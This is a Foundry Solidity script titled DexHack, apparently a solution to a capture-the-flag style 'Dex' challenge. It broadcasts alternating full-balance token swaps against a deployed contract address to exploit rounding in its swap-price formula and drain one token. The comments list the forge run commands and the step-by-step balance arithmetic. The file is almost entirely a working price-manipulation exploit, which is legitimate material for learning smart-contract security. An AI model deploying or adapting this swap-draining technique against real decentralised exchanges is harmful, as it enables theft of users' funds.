// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Dex} from "../src/Dex.sol";

contract DexHack is Script {
    Dex public dex = Dex(payable(0x5A773DC7cBADE04977521d1f6957BbCa0A4A8466));

    address token1 = dex.token1();
    address token2 = dex.token2();
    address accountAddress;

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        accountAddress = vm.addr(privateKey);

        vm.startBroadcast(privateKey);

        dex.approve(address(dex), type(uint256).max);

        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);

        dex.swap(token2, token1, 45);

        console.log("Token1 balance of dex", dex.balanceOf(token1, address(dex)));
        console.log("Token2 balance of dex", dex.balanceOf(token2, address(dex)));
        vm.stopBroadcast();
    }

    function _swap(address tokenIn, address tokenOut) internal {
        dex.swap(tokenIn, tokenOut, dex.balanceOf(tokenIn, accountAddress));
    }
}

// forge script script/Dex.s.sol -vv
// forge script script/Dex.s.sol -vv --broadcast

// 10  10
// 100 100
// (10 * 100) / 100
// 0   20
// 110 90

// 0   20
// 110 90
// (20 * 110)/90  = 24
// 24   0
// 86    110

// 24   0
// 86    110
// (24* 110)/86 = 30
// 0    30
// 110  80
